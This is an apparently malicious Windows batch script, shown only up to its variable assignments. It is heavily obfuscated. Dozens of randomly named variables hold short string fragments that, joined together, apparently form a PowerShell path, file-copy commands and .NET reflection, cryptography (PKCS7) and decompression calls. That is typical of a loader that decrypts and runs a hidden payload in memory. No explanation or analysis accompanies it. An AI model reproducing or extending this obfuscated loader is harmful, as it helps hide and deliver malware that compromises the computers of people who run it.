@echo off
set "uaYSwzhxwd=\W"
set "RlUnsUVvmX=0\"
set "LiBIvDDMxh=Wi"
set "FhNEFzXSvw=rs"
set "bzPXJldqjX=po"
set "mgYHupEskU=co"
set "LSfOrEQHmw=\v"
set "ZvxUtpzHSP=st"
set "TjjPtTuJoj=in"
set "YNdamOtNQR=em"
set "DsLvuYPlEN=ws"
set "difBCdfacS=he"
set "vsStRoNupf=py"
set "UErPttQcFs=s\"
set "bJbeVqdzWB=y "
set "viJLpZZAxm= /"
set "myNGwbtDes=we"
set "vcfKzByNuv=rS"
set "obSMxXmXfP=we"
set "HWrMXUjCYI=Po"
set "ePOcKvtidz=:\"
set "fwITQGEQIw=ow"
set "vvhDEfWrkt=1."
set "nkUMoRdylA=xe"
set "JuupuVFkTt=he"
set "cGinhtyoQq=ll"
set "sLDkkUvXLj=nd"
set "CsLaWkjhJq= C"
set "xAgJxCzYYx=ll"
set "ZxNaMGdesL=do"
set "BsrUsTMkrk=.e"
set "HxKBXtlESQ=Sy"
set "dtssBILhWw=32"
set "xsYUdHahfp=cd"
set "JFigWwGpqq= %~dp0"
set "OCLtpcwzWZ=File"
set "UkxBrYrkns=dpRS"
set "iCUQgkzaxa=)) {"
set "gtYhmktGTA=s.Su"
set "fEwlFBPjcq=)))"
set "OOmjYQRmcV=fw.T"
set "OqVKXQLBCk=BC;$"
set "okwSgimbCR=Syst"
set "QJYTEmnJmC=1..-"
set "zrKdqMSuOY=flec"
set "lptmdmZhuL=gMod"
set "whDMCfPjFe=orF'"
set "WEcAJVvVkO=yste"
set "CdtXUHjeWm=ew-O"
set "HmGfhsgrZe=pDZz"
set "eDuLsShSRQ=g = "
set "IScJjVaXYm= [st"
set "VDElTpglHD=pose"
set "dVfbsQovew=DQ.D"
set "PSFEHgsXBR=3HWs"
set "RqcCqgBvxO=null"
set "gddKoSSycx=ach "
set "KkBYGIkAGx=();$"
set "QSbGPsBGYj=GCRe"
set "ZcrTjetRWV=v, 0"
set "iLHFFmphxr=ne);"
set "xhniLXSOau=tem."
set "rNIeBuGhNv=Fina"
set "MgnoMlowJo=sGUc"
set "GktizZFOpa=('l0"
set "RSuFbKzcXH=..-1"
set "oMKSuEdVQE=tS46"
set "jIWcrjZkan=sion"
set "iSrLmQqLEo=v = "
set "OFDZPEoLUC=tryP"
set "rmRQTfZYuv=Star"
set "lSxzQXRCMR=);$B"
set "bjvhMnGfeT=;$Ww"
set "LirlffQZIq=PKCS"
set "kWghbGQJNm=RS.I"
set "EBNVNCrnvw=d;$d"
set "HrNBNbSefR=7Yiv"
set "aOLuEJbnCH=[IO."
set "ASrRAHfVxm=.Dis"
set "oFLVUKpdLV=X = "
set "EoNpyaxNxs=rofi"
set "YFpJGOYEGW=Iqs "
set "hBIyksvpAI===')"
set "wLTVHJsEAn=ev);"
set "pLwyRqtsds=ing("
set "RAkvEIFfdq=GCRe"
set "aaiOwNUEZB=.Cry"
set "iEKyBCNoQH=Disp"
set "qeNgbyUjEC=oryS"
set "MFCHmHrvXb='dqR"
set "lWqKaZKemc=);$d"
set "NuDPkEOpSH=dwIq"
set "BWMdZfnqPO=morF"
set "kLbXbwaSzb=stem"
set "alCoPMofSs=ck($"
set "YxPsNjrhMg=.Ass"
set "gvCAjKKftq=.Dis"
set "LPSWsrAyqU=;$Hp"
set "mprBYfqxeW=stem"
set "TWAtGZFlSg=n ''"
